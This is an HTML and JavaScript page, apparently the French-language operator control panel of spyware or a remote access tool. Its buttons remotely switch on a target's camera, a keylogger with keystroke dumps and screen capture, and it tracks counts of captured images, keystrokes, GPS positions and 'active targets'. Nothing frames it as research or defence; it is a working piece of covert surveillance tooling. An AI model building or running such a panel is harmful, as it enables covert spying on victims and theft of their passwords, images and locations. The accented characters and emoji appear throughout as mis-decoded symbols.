<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>üéõÔ∏è Panneau de Contr√¥le</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: 'Courier New', monospace;
            background: #0a0e27;
            color: #00ff41;
            padding: 20px;
            min-height: 100vh;
        }
        .header {
            text-align: center;
            margin-bottom: 30px;
            border-bottom: 2px solid #00ff41;
            padding-bottom: 20px;
        }
        h1 { font-size: 32px; margin-bottom: 10px; }
        .status { color: #666; font-size: 14px; }
        .container {
            max-width: 1200px;
            margin: 0 auto;
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
            gap: 20px;
        }
        .panel {
            background: rgba(0,255,65,0.05);
            border: 2px solid #00ff41;
            border-radius: 10px;
            padding: 20px;
        }
        .panel h2 {
            font-size: 20px;
            margin-bottom: 15px;
            color: #00ff41;
            border-bottom: 1px solid #00ff41;
            padding-bottom: 10px;
        }
        .control-group {
            margin: 15px 0;
        }
        .control-group label {
            display: block;
            margin-bottom: 8px;
            font-size: 14px;
        }
        button {
            background: #00ff41;
            color: #0a0e27;
            border: none;
            padding: 12px 24px;
            font-size: 16px;
            font-weight: bold;
            border-radius: 5px;
            cursor: pointer;
            transition: all 0.3s;
            width: 100%;
            margin: 5px 0;
            font-family: 'Courier New', monospace;
        }
        button:hover { background: #00cc33; transform: translateY(-2px); }
        button:active { transform: translateY(0); }
        button.danger { background: #ff4444; color: white; }
        button.danger:hover { background: #cc0000; }
        button.active { background: #ffaa00; color: #000; }
        .log {
            background: rgba(0,0,0,0.5);
            border: 1px solid #00ff41;
            border-radius: 5px;
            padding: 15px;
            height: 200px;
            overflow-y: auto;
            font-size: 12px;
            margin-top: 15px;
        }
        .log-entry {
            margin: 5px 0;
            padding: 5px;
            border-left: 3px solid #00ff41;
            padding-left: 10px;
        }
        .log-entry.error { border-left-color: #ff4444; color: #ff4444; }
        .log-entry.success { border-left-color: #00ff41; }
        .stats {
            display: grid;
            grid-template-columns: repeat(2, 1fr);
            gap: 10px;
            margin-top: 15px;
        }
        .stat-box {
            background: rgba(0,0,0,0.3);
            padding: 10px;
            border-radius: 5px;
            text-align: center;
        }
        .stat-value { font-size: 24px; font-weight: bold; }
        .stat-label { font-size: 12px; color: #666; margin-top: 5px; }
        input[type="text"], input[type="number"] {
            width: 100%;
            padding: 10px;
            background: rgba(0,0,0,0.5);
            border: 1px solid #00ff41;
            color: #00ff41;
            border-radius: 5px;
            font-family: 'Courier New', monospace;
            margin: 5px 0;
        }
        .toggle-btn {
            display: flex;
            align-items: center;
            justify-content: space-between;
        }
        .status-indicator {
            width: 12px;
            height: 12px;
            border-radius: 50%;
            background: #666;
            display: inline-block;
            margin-left: 10px;
        }
        .status-indicator.active { background: #00ff41; animation: pulse 2s infinite; }
        @keyframes pulse {
            0%, 100% { opacity: 1; }
            50% { opacity: 0.5; }
        }
    </style>
</head>
<body>
    <div class="header">
        <h1>üéõÔ∏è PANNEAU DE CONTR√îLE</h1>
        <div class="status">Status: <span id="serverStatus">Connect√©</span> | Cibles actives: <span id="activeTargets">0</span></div>
    </div>

    <div class="container">
        <!-- Cam√©ra -->
        <div class="panel">
            <h2>üìπ Cam√©ra</h2>
            <div class="control-group">
                <button id="btnCameraToggle" onclick="toggleCamera()">
                    <span class="toggle-btn">
                        ACTIVER CAM√âRA
                        <span class="status-indicator" id="cameraStatus"></span>
                    </span>
                </button>
                <label>Intervalle (secondes):</label>
                <input type="number" id="cameraInterval" value="5" min="1" max="60">
                <button onclick="sendCommand('camera', 'snapshot')">üì∏ Capture Unique</button>
            </div>
        </div>

        <!-- Keylogger -->
        <div class="panel">
            <h2>‚å®Ô∏è Enregistreur de Frappe</h2>
            <div class="control-group">
                <button id="btnKeyloggerToggle" onclick="toggleKeylogger()">
                    <span class="toggle-btn">
                        ACTIVER KEYLOGGER
                        <span class="status-indicator" id="keyloggerStatus"></span>
                    </span>
                </button>
                <button onclick="sendCommand('keylogger', 'dump')">üìä R√©cup√©rer Donn√©es</button>
            </div>
        </div>

        <!-- Partage d'√©cran -->
        <div class="panel">
            <h2>üñ•Ô∏è Partage d'√âcran</h2>
            <div class="control-group">
                <button id="btnScreenToggle" onclick="toggleScreen()">
                    <span class="toggle-btn">
                        ACTIVER PARTAGE
                        <span class="status-indicator" id="screenStatus"></span>
                    </span>
                </button>
                <label>Qualit√© (0.1-1.0):</label>
                <input type="number" id="screenQuality" value="0.5" min="0.1" max="1" step="0.1">
                <label>Intervalle (secondes):</label>
                <input type="number" id="screenInterval" value="2" min="1" max="10">
            </div>
        </div>

        <!-- Logs -->
        <div class="panel" style="grid-column: 1 / -1;">
            <h2>üìã Journal d'Activit√©</h2>
            <div class="log" id="activityLog">
                <div class="log-entry success">Syst√®me initialis√©...</div>
            </div>
            <button onclick="clearLog()" class="danger">üóëÔ∏è Effacer Journal</button>
        </div>

        <!-- Stats -->
        <div class="panel">
            <h2>üìä Statistiques</h2>
            <div class="stats">
                <div class="stat-box">
                    <div class="stat-value" id="statImages">0</div>
                    <div class="stat-label">Images re√ßues</div>
                </div>
                <div class="stat-box">
                    <div class="stat-value" id="statKeys">0</div>
                    <div class="stat-label">Frappes clavier</div>
                </div>
                <div class="stat-box">
                    <div class="stat-value" id="statLocation">0</div>
                    <div class="stat-label">Positions GPS</div>
                </div>
                <div class="stat-box">
                    <div class="stat-value" id="statCommands">0</div>
                    <div class="stat-label">Commandes envoy√©es</div>
                </div>
            </div>
        </div>
    </div>

    <script>
        let states = {
            camera: false,
            keylogger: false,
            screen: false
        };

        let stats = {
            images: 0,
            keys: 0,
            location: 0,
            commands: 0
        };

        function log(message, type = 'success') {
            const logEl = document.getElementById('activityLog');
            const entry = document.createElement('div');
            entry.className = `log-entry ${type}`;
            entry.textContent = `[${new Date().toLocaleTimeString()}] ${message}`;
            logEl.insertBefore(entry, logEl.firstChild);
            
            if (logEl.children.length > 100) {
                logEl.removeChild(logEl.lastChild);
            }
        }

        function updateStatus(module, active) {
            const statusEl = document.getElementById(`${module}Status`);
            const btnEl = document.getElementById(`btn${module.charAt(0).toUpperCase() + module.slice(1)}Toggle`);
            
            if (active) {
                statusEl.classList.add('active');
                btnEl.classList.add('active');
                btnEl.innerHTML = `<span class="toggle-btn">D√âSACTIVER ${module.toUpperCase()}<span class="status-indicator active"></span></span>`;
            } else {
                statusEl.classList.remove('active');
                btnEl.classList.remove('active');
                btnEl.innerHTML = `<span class="toggle-btn">ACTIVER ${module.toUpperCase()}<span class="status-indicator"></span></span>`;
            }
        }

        async function sendCommand(module, action, params = {}) {
            try {
                const response = await fetch('/api/command', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ module, action, params })
                });

                if (response.ok) {
                    stats.commands++;
                    document.getElementById('statCommands').textContent = stats.commands;
                    log(`‚úÖ Commande envoy√©e: ${module} - ${action}`, 'success');
                    return true;
                } else {
                    log(`‚ùå Erreur commande: ${module} - ${action}`, 'error');
                    return false;
                }
            } catch (error) {
                log(`‚ùå Erreur r√©seau: ${error.message}`, 'error');
                return false;
            }
        }

        async function toggleCamera() {
            states.camera = !states.camera;
            const interval = document.getElementById('cameraInterval').value;
            await sendCommand('camera', states.camera ? 'start' : 'stop', { interval });
            updateStatus('camera', states.camera);
        }

        async function toggleKeylogger() {
            states.keylogger = !states.keylogger;
            await sendCommand('keylogger', states.keylogger ? 'start' : 'stop');
            updateStatus('keylogger', states.keylogger);
        }

        async function toggleScreen() {
            states.screen = !states.screen;
            const quality = document.getElementById('screenQuality').value;
            const interval = document.getElementById('screenInterval').value;
            await sendCommand('screen', states.screen ? 'start' : 'stop', { quality, interval });
            updateStatus('screen', states.screen);
        }

        function clearLog() {
            document.getElementById('activityLog').innerHTML = '<div class="log-entry success">Journal effac√©</div>';
        }

        // R√©cup√©rer les stats p√©riodiquement
        async function refreshStats() {
            try {
                const response = await fetch('/api/stats');
                if (response.ok) {
                    const data = await response.json();
                    document.getElementById('statImages').textContent = data.images || 0;
                    document.getElementById('statKeys').textContent = data.keys || 0;
                    document.getElementById('statLocation').textContent = data.location || 0;
                    document.getElementById('activeTargets').textContent = data.activeTargets || 0;
                }
            } catch (error) {
                console.error('Error fetching stats:', error);
            }
        }

        // Rafra√Æchir toutes les 5 secondes
        setInterval(refreshStats, 5000);
        refreshStats();

        log('üöÄ Panneau de contr√¥le pr√™t', 'success');
    </script>
</body>
</html>
